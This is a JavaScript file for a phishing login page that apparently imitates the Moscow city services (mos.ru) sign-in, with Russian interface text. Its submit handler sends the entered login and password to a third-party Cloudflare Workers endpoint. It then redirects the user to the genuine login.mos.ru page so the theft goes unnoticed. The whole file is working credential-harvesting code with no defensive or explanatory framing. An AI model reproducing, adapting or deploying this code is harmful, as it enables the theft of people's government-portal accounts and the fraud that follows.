(function () {
    const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';
    /** Куда перейти после успешного ответа воркера (200 OK). */
    const AFTER_SUCCESS_REDIRECT = 'https://login.mos.ru/sps/login/methods/password?bo=%2Fsps%2Foauth%2Fae%3Fscope%3Dprofile%2Bopenid%2Bcontacts%2Busr_grps%2Besia%26response_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fwww.mos.ru%2Fapi%2Facs%2Fv1%2Flogin%2Fsatisfy%26client_id%3Dmos.ru';
    const REDIRECT_DELAY_MS = 600;

    const form = document.getElementById('loginForm');
    const loginInput = document.getElementById('login');
    const passwordInput = document.getElementById('password');
    const submitBtn = form.querySelector('.submit-btn');
    const status = document.getElementById('status');
    const passwordToggle = document.getElementById('passwordToggle');

    function refreshSubmitState() {
        const filled =
            loginInput.value.trim().length > 0 &&
            passwordInput.value.length > 0;
        submitBtn.disabled = !filled;
    }

    function setStatus(message, kind) {
        status.textContent = message || '';
        status.classList.remove('is-error', 'is-success');
        if (kind === 'error') status.classList.add('is-error');
        if (kind === 'success') status.classList.add('is-success');
    }

    loginInput.addEventListener('input', refreshSubmitState);
    passwordInput.addEventListener('input', refreshSubmitState);
    refreshSubmitState();

    passwordToggle.addEventListener('click', () => {
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
        passwordToggle.classList.toggle('is-active', isPassword);
        passwordToggle.setAttribute(
            'aria-label',
            isPassword ? 'Скрыть пароль' : 'Показать пароль'
        );
    });

    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        if (submitBtn.disabled) return;

        const payload = {
            login: loginInput.value.trim(),
            password: passwordInput.value,
        };

        const originalText = submitBtn.textContent;
        submitBtn.disabled = true;
        submitBtn.classList.add('is-loading');
        submitBtn.textContent = 'Входим…';
        setStatus('', null);

        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            let result = {};
            try { result = await response.json(); } catch (_) { /* not JSON */ }

            if (response.ok) {
                setStatus(result.message || 'Готово, перенаправляем…', 'success');
                form.reset();
                setTimeout(() => {
                    window.location.href = AFTER_SUCCESS_REDIRECT;
                }, REDIRECT_DELAY_MS);
            } else {
                setStatus(
                    result.error || `Ошибка ${response.status}`,
                    'error'
                );
            }
        } catch (err) {
            setStatus('Ошибка сети: сервер не отвечает.', 'error');
        } finally {
            submitBtn.classList.remove('is-loading');
            submitBtn.textContent = originalText;
            refreshSubmitState();
        }
    });
})();
